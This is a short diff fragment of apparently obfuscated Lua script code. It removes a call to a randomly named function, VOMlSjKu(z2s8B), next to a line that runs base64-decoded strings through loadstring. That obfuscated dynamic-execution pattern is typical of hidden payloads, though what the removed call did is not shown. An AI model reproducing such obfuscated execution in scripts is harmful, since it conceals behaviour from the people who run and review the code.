@@ -1571,5 +1571,5 @@ if type(notify) == loadstring(base64decode("ZnVuY3Rpb24="))() then notify(loadst
 
 while true do wait(1) end
 end
-VOMlSjKu(z2s8B)
+
 end)(...)
